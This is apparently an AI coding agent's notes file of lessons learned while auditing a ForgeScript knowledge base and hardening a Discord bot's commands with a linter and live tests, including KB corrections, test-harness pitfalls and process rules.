8. **`$parseString` IS the native text→ms converter** (returns 0 on failure) — the KB's recommendation to hand-build a djsEval regex parser is WRONG. `$parseString` exists and works.

9. **Custom function param-name convention** — underscore prefix (`_code`, `_time`) prevents collision with working `$let[code]`/`$let[time]`.

10. **`$callLocalFunction` shares env with the caller** (unlike ForgeFunctions where writes don't escape). This is a KB correction — the "writes don't escape" claim applies to `functions.add`, NOT to `$fn` locals.

### KB Corrections Applied

These contradictions between the KB and reality were found and should be fixed in the relevant files:
- `$parseString` is the native text→ms parser (quick-reference should point here, not to hand-built djsEval)
- `$clientToken` DOES exist (task-to-function-map says it doesn't)
- Local function env writes DO escape to the caller (custom-functions-two-systems correction)
- `$parseMS` takes [ms; precision; separator; (4th)] — more than 1 arg
- The `\$fn` backslash quirk (double backslash before a function = function executes, backslash vanishes)
- `$#` on nested calls is ignored (not "execution continues")
- `$let`/`$get` ≠ `$env` store

Lesson: **the runtime source is always the truth, the KB is a map that can have errors.** Every KB claim should be verifiable by reading the installed runtime or executing a test. The three-agent mining approach (internals + catalog + real-world usage) triangulates truth from three directions.

## The standing intake rules (user-mandated, 2026-09-26)

**Added 2026-09-29 (user-mandated, permanent):**
- **Consult the knowledge and wisdom folders FIRST before creating any command** — the KB (2,460 function pages, core docs) and wisdom (gotchas, patterns, design rules) exist to prevent rediscovering traps the hard way. Task-to-function-map answers "which function", function-relationships answers "in what order", quick-reference answers "what are the traps".
- **ALWAYS run new or modified commands through the fslinter** (`python3 tools/fslint.py <file>`), and live-test them (synthetic gateway suite) before declaring them done. Compile-clean ≠ correct: the bracket-escape bug class and the sci-notation color trap both passed validate.js and 76 lint checks and still broke at runtime. Only live execution catches runtime-only failure modes.
- Both rules are enforced in practice: fslint findings block a change from being called done; test suites (tests/synth.js 17, tests/visual.js 8, tests/allsweep.js 77) are the definition of verified.


1. **Submissions are hypotheses, not specs** — outdated, wrong, or self-contradicting material is expected, not exceptional. The migration post proved all three at once (a body claim reversed by its own DEPRECATED note).
2. The audit loop is: **understand → diff against knowledge+source → explain the real mechanism in wisdom → if broken/outdated, author a corrected version → verify that correction end-to-end**. A correction is not done until every function, signature, index base, and shape in it re-checks against current `main`.
3. **My own outputs are audit targets** — error lists, recipes, early exploration notes, even this file. Fossilized early beliefs ($textSplit "doesn't exist", `$mentioned[1]`) are the #1 self-inflicted bug class.
4. When a submission's mental model differs from the mechanism, the wisdom file states the mechanism — the submission's framing is preserved in `code/` as received, never "fixed" in place.

## Environment notes for this setup

- Shallow clones live in `/tmp/opencode/` (PRoot/Android — `/workspace` is the durable spot, `/tmp` is scratch; if the container resets, refresh.sh re-clones automatically).
- ~2,900 generated files render in ~13MB; regenerating the whole tree takes under a minute locally.
- The Guest Browser WebView in this app often lacks a devtools socket — don't count on driving the SPA; the API+raw-GitHub path is the reliable one.

## Knowledge-base deep-dive + community verification campaign (2026-09-28, final)

User-mandated: audit the whole KB with subagents, fix errors, verify against live sites/GitHub, study community bots (verified first), and fold everything back into wisdom. Four parallel audit agents (functions / events+enums / core+validate+tools / extensions+guides+changelog) + two field agents (8 bots, 5 extensions) + live-source verification. Outcomes:

### Errors found & fixed

1. **Core docs carried 8 real errors** (audit #3): 3 hallucinated names (`$fetchUser` in a prefix example, `$await` for `$wait`, `$arrayGet`-as-alias claim), a `$checkCondition` self-contradiction, bot-setup's legacy slash table, `mobileStatus`→`mobile`, and a **wrong privileged-intent claim** (GuildMessageTyping/DirectMessageTyping are NOT privileged — the verified dataset says `privileged:false` for both). The intent claim was the worst kind: confident, specific, and wrong.
2. **7 extension function indexes were missing 331 alias rows** (forgecanvas 142, forgeindia 121, forgecolor 37, forgedb 21, ...). Root cause was NOT pagination (first theory) — the generator's index loop simply never listed aliases even though it generates alias stub pages. Fixed the indexes AND `generate.py` (both core and extension indexes now emit `Alias of` rows), so refresh won't regress.
3. **build_stats.json was self-inconsistent** (`ext_stats.ForgeScript = 0` — core is counted at top level only). Generator now mirrors core totals into the entry; cache synced to disk truth.
4. **Stale wisdom rows corrected**: quick-reference's `$parseMS` trap row still recommended the hand-built djsEval scanner next to the correction table saying `$parseString` exists (contradiction side-by-side — the fossil class again, now *inside* a corrections table's own file); security-notes said `$clientToken` doesn't exist (it's a live alias of `$botToken` — my false alarm during THIS session proves the alias-check rule needs to fire even on my own past "verified" claims).

### Live-source verification results

- Core metadata: live `metadata/functions.json` (1,120) == cache. **No drift.** Registry API live (13 extensions). npm `@tryforge/forgescript` latest = 2.7.1 — changelog current.
- **npm scope trap**: unscoped `forgescript` is an abandoned 2023 package (1.3.0). Current everything = `@tryforge/*`. Recorded in knowledge/README + ecosystem-judgment.
- **ForgeCanvas churn**: upstream pushed 2026-09-28 (alias additions) — page counts float with alias churn; the invariant is the canonical count. ForgeAPI discovered as a real non-registry `@tryforge/forge.api` npm package (HTTP bridge); six more TryForge repos are infrastructure, not registry packages.
- **GitHub org ≠ registry**: `github.com/forgescriptdev/*` 404s — the org is **TryForge**. The cache's `_registry.json` had the truth; my first guess from memory didn't.

### Count semantics (the class of confusion worth remembering)

Metadata files hold **canonical** functions only. KB page counts = canonical **+ alias stubs**. build_stats counts pages. Audits that diff page-count against metadata-count will "find" discrepancies that are just alias expansion (canvas: 111 canonical / 253-255 pages / 142-144 aliases depending on upstream's day). State which count you mean before comparing.

### What the audits did NOT find (also valuable)

functions/, events/, enums/ were internally perfect: 1,508 pages == ground truth, all 9,640 internal links resolve, all 1,106 embedded `execute()` blocks byte-identical to the harvest, events 1:1 with handlers.json across all 79, enums 1:1 with metadata, changelog pages 100% hallucination-free across 222 sampled names. The generator pipeline is trustworthy where it's mechanical; every error found lived in *hand-written interpretation* (core docs, wisdom, examples) or *hand-maintained aggregates* (stats, indexes). Direct future audit effort accordingly: machine-generated facts need spot-checks, hand-written claims need line-by-line verification.

### Field-study lessons (details in community-ecosystem-field-study.md)

- Community code fails on **names, not arity** (zero over-signature calls across 8 repos; 6/8 carry the `$pingms` ghost).
- Unknown-name triage order: alias → private extension → concatenation → local def → only then typo.
- Verification protocol (dep proof → pinned tag → token diff → decomposition → then architecture) prevented two false ghost reports.
- Stars ≠ quality (0★ forge.timers is the best-engineered repo; 20★ bot has ghost calls).

Lesson: this campaign shape works and is now the template — **parallel mechanical audits + live-source diff + verified-then-studied field samples + everything folded back into both folders**. The KB's own consistency (where generated) held; my hand-written layers were where all the errors lived — including two fossils that survived *previous* correction passes because the correction was written as a footnote next to the stale claim instead of replacing it. **Corrections must replace, not coexist.**

## Chronolith hardening campaign on fslint v4 (2026-09-28, evening): the linter pays for itself

User upgraded fslint 48→76→78 checks (v3.1→v4, porting the ForgeVSC engine), then mandated the command-hardening campaign. Structure: verify fslint state → add missing rules → mechanical fixes via two parallel subagents (generator track + hand-files track) → live E2E with the synthetic-gateway harness. End state: 172/0 static, 201/0 compile, **17/17 synth**, remaining warnings = 1 documented by-design FP + 6 perf skips.

New checks added (77 duplicated-$cooldown, 78 CustomID author-lock, 24b dynamic-snowflake jsonSet) — 77/78 fired zero on the real tree: the codebase was already clean there; that's a *finding*, not a waste (negative results certify).

### Bugs only the campaign found (all fixed)

1. **Dynamic-snowflake jsonSet writes** — check 23 only matched literal digits; the live bug class is `$get[x]`/`$env[x]` values that *resolve* to IDs. Found & fixed: cfg.reports, cfg.autorole, cfg.muterole, cfg.verify.role (generator spec ×2 mirrors each), snipe events `$authorID` (the multi-agent audit's fix that "never propagated" — really: never landed), punish.js ok/fail CSVs (single-ID list = bare number = rounded). Plus the DB already carried a rounded cfg.modlog (`…34000`) — repaired the row. Check 24b now exists in two tiers: error for ID-certain sources, info for could-be-text dynamics.
2. **Empty-coercion range gates**: `$and[$get[s]>=0,$get[s]<=21600]` passes when `s` is EMPTY (`"">=0` coerces true) — `%slowmode` with no args actually SET the channel's slowmode to "" instead of printing usage. Fix: prepend `$get[s]!=,` to the condition. Sweep found no other instances.
3. **Illegal-return djsEval** (targets.js reply-fallback): bare top-level `return` in eval is a SyntaxError → the whole command aborts with no reply. Masked until now because a `\;` escape bug had truncated that code path to dead bytes — fixing the truncation *woke up* the illegal code. Rule: every multi-statement djsEval body gets the `(() => { ... })()` IIFE wrapper (duration.js always had it right).
4. **Slash punish mirrors never rendered Applied/Skipped** — missing `$jsonLoad[rj;$get[r]]` in 4+ slash files; the fields were silently empty since generation.
5. **Orphan duplicate command file** (prefixesCmd/cases/modlog.js) — deleted; it double-registered with different behavior.

### Test-harness lessons (the uncomfortable class)

- **4 of 6 "failures" were stale needles**: the suite expected "Pong"/"Uptime"/"Usage: unban"/"ocking down" while the commands' copy had evolved to "Gateway"/"Runtime"/"Provide one or more"/"Locked". A failing E2E is a *diff between two claims* — the test is as much a suspect as the code. Read the actual reply before debugging the bot (one 60-line probe harness answered in seconds what 20 minutes of code-reading couldn't).
- **%tempban tested a command that does not exist** — timed bans are `ban <duration>`; the needle was fossilized from an older command surface. Tests must derive from the current spec, not memory.
- **Needle semantics**: the matcher ANDs needles — `["nlocked","Unlocked","No locked"]` can never all match; alternatives need substring-overlap trickery or single needles.
- **Mutating probes need cleanup pairs** — `%lockdown` really locks channels; the suite now follows it with `%unlock`. Probes that mutate state should restore it in-suite, and the harness author must check for residue (we found none only because the gates were failing).
- The fabricated member needs `roles: []` awareness: isMod passes for the guild OWNER (owner-implicit-mod), so mod-gated probes pass legitimately — but permission-hierarchy probes would need real role arrays (campaign I lesson still true).

### Process lessons

- **Two parallel subagents on disjoint scopes works** — generator-track vs hand-files-track never collided; each flagged the other's mid-session edits as "external" but scopes held. One interrupted-by-phone-death agent left two files half-fixed; the re-dispatch instruction "verify previous diffs, keep, continue" recovered cleanly. Partial-agent-work recovery = inspect the diff, don't redo blind.
- **Fix generators, not outputs**: every generated-file fix went through gen_commands.py spec; regeneration is byte-reproducible (verified before editing). The one hazard (hand-fixed reports.js) was checked and was already ported into the spec.
- **Live probing beats static reasoning for copy-evolution questions** — when a test fails, dump the actual reply first.

Lesson: the encode-rules-then-fix-then-prove pipeline (linter rules → mechanical fixes → live E2E) converted 160 warnings into 6 documented residuals and surfaced 5 real bugs — two of which (slowmode mutation, ban silent-abort) were user-facing. The linter investment compounds: every wisdom trap class became a check, and every check became executable.

## One token, one process — enforce it in code, not habit

Every gateway session on a token receives every event. Two sessions = every command runs twice, every interaction answered twice ("already acknowledged" for the loser, races for both). Kill-by-single-PID restarts leak survivors; the only safe restart is kill-them-all + verify-none + start-one + verify-one, and the startup lock should refuse LOUDLY (with the recovery command in the message), not exit quietly. When something behaves "flaky" on Discord, count your processes before blaming the code.

## Deletion audits enumerate DEFINED names, not remembered ones

Greping for the names you *think* a module uses invites false confidence — I shelved a duration parser by grepping its sibling's name. The correct audit for "is X safe to delete": list what X DEFINES, then grep consumers for each defined name, then check shelved/experimental callers too. Symmetric rule for installs: verify every function a new file calls actually exists in the package (unregistered `$fn` compiles as literal text — validate.js will not save you).

## Verify hand-offs with the compiler, not just scanners

Custom bracket scanners and `node --check` both false-negative on this platform (scanners miscount `$!` prefixes and double-escaped `\\[`; the real compiler accepts things scanners flag). The authoritative gates, in order: `validate.js` (real compiler, lazy function bodies force-compiled), then a live fabrication harness, then real Discord. Keep fabrication harnesses for messageCreate, buttons, select menus AND slash interactions — but know that slash probes cannot pass `$defer` offline (the fake token 404s the callback mid-flow).

## The user is a rigorous reviewer — design the loop around it

Handing over verbatim files and receiving annotated fix-lists caught bugs three review rounds in a row that I missed writing the code (multi-target drops, decimal colors, hierarchy gaps, DM ordering). The loop that works: ship verbatim → they return fixed files + a claims list → verify every claim live before installing → record what the claims taught in the KB. Never batch-accept; each round's "I haven't run this live" means the live-verification step is mine.
